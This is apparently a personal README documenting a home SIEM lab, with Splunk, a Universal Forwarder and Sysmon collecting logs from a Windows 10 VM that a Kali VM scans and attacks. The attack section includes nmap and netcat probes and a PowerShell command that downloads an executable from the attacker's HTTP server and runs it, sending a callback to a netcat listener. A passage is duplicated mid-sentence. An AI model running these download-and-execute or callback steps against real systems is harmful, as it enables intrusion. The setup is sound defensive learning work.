# SIEM-lab
A lab so I can familiarize myself with Ubuntu Server, SIEM and firewalls.

## Goal

Simulate a basic enterprise network with log sources, an attacker, and a SIEM system to analyze and monitor security events.

## Lab Topology

- **Victim-Win**: Windows 10 client, target for attacks
- **SIEM-Server**: Ubuntu Server 22.04 with Splunk installed
- **Attacker-Kali**: Kali Linux VM used for simulating attacks

## VM Configuration

### Victim-Win
- OS: Windows 10
- RAM: `4 GB`
- DISK: `60 GB`
- CPU Cores: `2`
- Notes: TBA
- Problems faced: Windows cannot read the ProductKey [solution](https://www.reddit.com/r/virtualbox/comments/1c1o605/error_installing_windows_windows_cannot_read_the/)

### SIEM-Server
- OS: Ubuntu Server 24.04 LTS
- RAM: `8 GB`
- DISK: `100 GB`
- CPU Cores: `4`
- Notes: TBA
- Installed packages:
  - curl, wget, vim, net-tools
  - openssh-server
  - ufw (Uncomplicated Firewall)

### Attacker-Kali
- OS: Kali Linux
- ova downloaded

## Setting Up

### SIEM-Server Splunk Install

I used `wget` to download the .deb package on my Ubuntu Server.
```bash
wget -O splunk.deb "I didn't keep the link"
sudo dpkg -i splunk.deb
```
After that I accepted the splunk license & started splunk with:
```bash
sudo /opt/splunk/bin/splunk start --accept-license
```
and then I set admin credentials.
Lastly, I enabled splunk to start at boot:
```bash
sudo /opt/splunk/bin/splunk enable boot-start
```

### Victim-Win `gpedit.msc`

I pressed `Win + R` typed `gpedit.msc` and went to:
Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
After that I enabled `Turn on Module Logging` and `Turn on PowerShell Script Block Logging`.
I also downloaded `Sysmon`.

### Attacker-Kali

Just made sure all the things I need were there.

## Creating Host-Only Network in VirtualBox

Click `File` → `Tool` → `Network Manager`. Now, click create and leave DHCP disabled.

### Assign Host-Only Adapter to Each VM

Open VM Settings and go to `Network`.
The settings should look like this: 
<img title="Host-Only Adapter" alt="Host-Only Settings" src="/images/host-only.png">

Do this for every VM (Attacker-Kali, Victim-Win and SIEM-Server).

### Static IP Plan

| VM Name       | IP Address      | Role             | OS            |
| ------------- | --------------- | ---------------- | ------------- |
| SIEM-Server   | `192.168.56.10` | Splunk Server    | Ubuntu Server |
| Victim-Win    | `192.168.56.20` | Target Machine   | Windows 10    |
| Attacker-Kali | `192.168.56.30` | Attack Simulator | Kali Linux    |
| Host Machine  | `192.168.56.1`  | Network Gateway  | (VirtualBox)  |

#### Set Static IP on Ubuntu Server

Now I have to find and edit the netplan config:
```bash
ls /etc/netplan/
sudo vim /etc/netplan/50-cloud-init.yaml
```
I changed it to (also I enable a second NAT adapter):
```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: no
      addresses: [192.168.56.10/24]
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]

    enp0s8:
      dhcp4: true
```
Now run: 
```bash
sudo netplan apply
```
And check with `ip a` that everything is ok.

Let's go back to the `Victim-Win` VM to set a static IP.

#### Set Static IP on Windows 10 VM

Here we can just open the `Control Panel` > `Network and Sharing Center`. Click on `Ethernet` and `Properties`. Select `Internet Protocol Version 4 (TCP/IPv4)` > Click `Properties`.
Set:
- IP: 192.168.56.20
- Subnet: 255.255.255.0
- Gateway: 192.168.56.1
- DNS: 8.8.8.8
<img title="Windows IP Settings" alt="Windows-Static-IP" src="/images/win-static-ip.png">

To check if it works just do: `ping 192.168.56.10`

<img title="Example Ping" alt="Example-Ping-Image" src="/images/example_ping.png">


#### Set Static IP on Attacker-Kali

Keep in mind I've enabled a second NAT adapter.
I just edited the file `/etc/network/interfaces` and added these line
```bash
# loopback
auto lo
iface lo inet loopback

# Host-Only interface (no gateway)
auto eth0
iface eth0 inet static
  address 192.168.56.30
  netmask 255.255.255.0
  dns-nameservers 8.8.8.8

# NAT interface (for internet)
allow-hotplug eth1
iface eth1 inet dhcp
```

After that just do
```bash
sudo ifdown eth0 || true
sudo ifup eth0
```

To check if it works just use `ip a` and `ping` just like I did before.

Finally, we can access Splunk from our host machine but using the link `http://192.168.56.10:8000/` and the credentials we set.

### Sysmon64 Setup

```ps1
Sysmon64 -accepteula -i sysmonconfig.xml
```

I just used `sysmonconfig.xml` file that I found on github by SwiftOnSecurity


## Using Splunk UF

Now we have to install Splunk Universal Forwarder.
The only thing we have to watch out for during the setup is to configure the receiving indexer properly with `192.168.56.10` and port `9997`.

<img title="Receiving Indexer" alt="Image here" src="/images/Receiving_Indexer.png">

After that we go to Splunk UI on our Host Machine and then `Settings` > `Forwarding and Receiving` > `Configure Receiving` and add port `9997`.

<img title="Configure-receive" alt="Image here" src="/images/configure_receiving.png">

Now if we run on SIEM-Server:
```bash
sudo netstat -tulnp | grep 9997
```
we should get an output that looks like this:
```bash
tcp        0      0 0.0.0.0:9997       0.0.0.0:*       LISTEN      <splunk_pid>/splunkd
```
Another way to see if everything is working is to run:
```bash 
sudo netstat -an | grep 9997
```
You should see our Victim-Win IP and SIEM-Server IP and `ESTABLISHED`.

Also, you can check on Victim-Win by pressing `Win` + `R` and searching for `services.msc` if you see `SplunkForwarder` and `Running`:
<img title="SplunkUF Runniong" alt="image here" src="/images/splunk_uf_running.png">


And after all that it wasn't working... but I found the solution... 
1. Go to `C:\Program Files\SplunkUniversalForwarder\etc\system\local`
2. If there is no `input.conf` file then create one
3. Add this inside
  ```conf
  [default]
  host = 192.168.56.20
  
  [WinEventLog://System]
  disabled = 0
  
  [WinEventLog://Security]
  disabled = 0
  
  [WinEventLog://Application]
  disabled = 0
  ```
4. Restart the service (there is usually a problem with restarting the service `Restart-Service Splunk...` you should just Stop the Service and then Start it with `Start-Service`.)

Now if we go to Splunk UI on our machine and search `index="*" host="192.168.56.20"` we should see it working.

<img title="Splunk Working" alt="Image here" src="/images/Splunk_working.png">

Let's add `Sysmon` to our `input.conf` file:
```conf
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
renderXml = 1
```

After that we still won't be seeing sysmon events in Splunk... to fix that we need to change the
service to run as `LocalSystem`. You can check what it is running as by running this command
```ps1
Get-WmiObject Win32_Service -Filter "Name='SplunkForwarder'" | Select-Object Name, StartName
```

In the `scripts` folder of this repository I added a [script](/scripts/localsys_splunkuf.ps1) file that fixes this
problem. I suggest you only use it in a similar situation where you are just testing it on a VM.
This is a <b>Lab setup, not production</b>. I haven't worked in real production enviroments yet,
but I can tell it's a bad idea to set this up as `LocalSystem` on a machine that accesses the internet.

Some things you might need to install are:
1. Splunk for Sysmon
2. Splunk for Microsoft Windows
You can find them in Splunk by clicking `Apps` > `Find More Apps`.

To check if it's working in the Splunk UI on our host machine we can search `index=* host="192.168.56.20" sourcetype="XmlWinEventLog"`.
Lab setup, not production</b>. I haven't worked in real production enviroments yet,
but I can tell it's a bad idea to set this up as `LocalSystem` on a machine that accesses the internet.

Some things you might need to install are:
1. Splunk for Sysmon
2. Splunk for Microsoft Windows
3. Splunk Universal Forwarder Extension
You can find them in Splunk by clicking `Apps` > `Find More Apps`.

### Setting Up `winlogs` Index In Splunk

This is optional but very useful. If you go in the Splunk UI to `Indexes` and add a new one called `winlogs` you can specify it in your `input.conf` file.
This is what I did to my file: 
```
[WinEventLog://Security]
disabled = 0
index = winlogs

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = winlogs
```

#### Creating Table `index=winlogs host=Victim-Win`

This is optional too. Just search `index=winlogs host=Victim-Win`, you need to have the `winlogs` index and then create a `Table`. 
This is a List of the most essential fields.

Core Event Fields:

 - `_time` - Timestamp (essential for timeline analysis)
 - `EventID` - Sysmon event type identifier
 - `Computer` or `ComputerName` - Source system
 - `host` - Splunk host field

Process Activity Fields:

  - `Image` - Process executable path
  - `ProcessId` - Process identifier
  - `ProcessGuid` - Unique process identifier
  - `CommandLine` - Full command line executed
  - `ParentImage` - Parent process executable
  - `ParentProcessId` - Parent process identifier
  - `User` - User context

File/Registry Activity:

  - `TargetObject` - Registry operations target
  - `Details` - Additional event details

Network Activity:

  - `SourceIp` / `src_ip` - Source IP address
  - `DestinationIp` / `dest_ip` - Destination IP address
  - `SourcePort` / `src_port` - Source port
  - `DestinationPort` / `dest_port` - Destination port
  - `Protocol` - Network protocol

Hash/Security Fields:

  - `Hashes` - File hashes (MD5, SHA256, etc.)
  - `IntegrityLevel` - Process integrity level

Additional Context:

  - `RuleName` - Sysmon rule that triggered
  - `UtcTime` - UTC timestamp from Sysmon

## Attacking Victim-Win

Let's start by scanning the network we will use this command `nmap -sP 192.168.56.0/24`:

<img title="SIEM Nmap Network scan" alt="Image here" src="/images/siem_nmap_network_scan.png">

As we can see all machines show up.
I won't be attacking SIEM-Server (probably).

Now let's scan for open ports. Quick reminder our firewall is up and we haven't opened any ports yet. We will use the command `nmap -sS -p- 192.168.56.20`.

<img title="nmap SYN scan" alt="Image here" src="/images/nmap_SYN_scan.png">

And we found an open port! `7680` running `pando-pub` service. 
Now let's do a version scan:

<img title="nmap Version scan" alt="Image here" src="/images/7680_port_scan_version.png">

The service version detection shows pando-pub? with a question mark, meaning nmap couldn't definitively identify the service version or get a proper banner response.
Now a script scan:

<img title="nmap Script scan" alt="Image here" src="/images/7680_port_scan_script.png">

Ok let's try something else.. `telnet 192.168.56.20 7680`:

<img title="Telnet connection" alt="Image here" src="/images/telnet_connection.png">

Service Behavior:
 - Accepts connections but doesn't respond to any commands
 - No error messages or acknowledgments
 - Doesn't close connection on invalid input
 - Silent service - potentially dangerous for security

After that I tried spamming the command `python3 -c "print('A' * 10)" | nc 192.168.56.20 7680`:

<img title="nc spam" alt="Image here" src="/images/nc_spam.png">

After a quick google search I found that there are no known exploits but it can be misidentified as a `Pando Media Booster`.

### Getting PID

Inside of `scripts`, I have a file called `payload.c` this program sends the PID to `Attacker-Kali` when run.
#### Attacker-Kali Commands
To run this you have to compile it with `x86_64-w64-mingw32-gcc pid_sender.c -o pid_sender.exe -lwininet`, we use the cross-compiler for Windows 64-bit systems.
After that we can start a simple HTTP Server with this command `python3 -m http.server 80`. In another terminal run a listener by using this command `nc -lvnp 9000`.

#### Victim-Win Commands

Open Powershell and run:
```ps1
Invoke-WebRequest -Uri http://192.168.56.30/pid_sender.exe -OutFile pid_sender.exe
```
or just open your browser and search `http://192.168.56.30/pid_sender.exe`.
Just run `.\pid_sender.exe`.

Now you should see in your Attacker-Kali machine:
```bash
┌──(kali㉿kali)-[~/payload-host]
└─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) .
192.168.56.20 - - [28/Jul/2025 14:58:09] "GET /pid_sender.exe HTTP/1.1" 200 -
```
and in the terminal with the listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9000

listening on [any] 9000 ...
connect to [192.168.56.30] from (UNKNOWN) [192.168.56.20] 56236
GET / HTTP/1.1
User-Agent: MyBOF
Host: 192.168.56.30:9000
Cache-Control: no-cache
```

And in Splunk we see this !.. :

In the search:

<img title="Pid_sender.exe" alt="Image here" src="/images/pid_sender.png">

In the dataset:
<img title="Pid_sender.exe" alt="Image here" src="/images/dataset_1.png">
<img title="Pid_sender.exe" alt="Image here" src="/images/dataset_2.png">

